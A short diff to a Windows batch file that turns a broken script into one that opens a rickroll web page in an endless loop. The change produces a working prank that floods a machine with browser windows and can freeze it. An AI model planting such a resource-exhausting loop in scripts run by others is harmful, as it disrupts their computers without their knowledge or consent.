@@ -1,4 +1,4 @@
 @echo off
-
+:X
 start https://www.therickroll.com
-loop
+goto :X
